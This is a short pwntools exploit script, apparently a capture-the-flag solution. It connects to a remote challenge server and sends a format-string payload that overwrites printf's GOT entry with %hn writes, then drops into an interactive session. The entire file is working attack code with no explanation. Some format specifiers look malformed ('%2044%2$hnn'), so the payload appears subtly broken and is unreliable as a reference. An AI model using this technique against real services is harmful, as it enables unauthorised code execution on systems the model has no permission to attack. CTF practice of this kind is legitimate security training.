from pwn import*

p = remote("ctf.j0n9hyun.xyz", 3002)

printf_got = 0x0804a00c

pay = p32(printf_got+2)
pay += p32(printf_got)
pay += "%2044%2$hnn" + "%32176c%3$hnn"

p.sendline(pay)
p.interactive()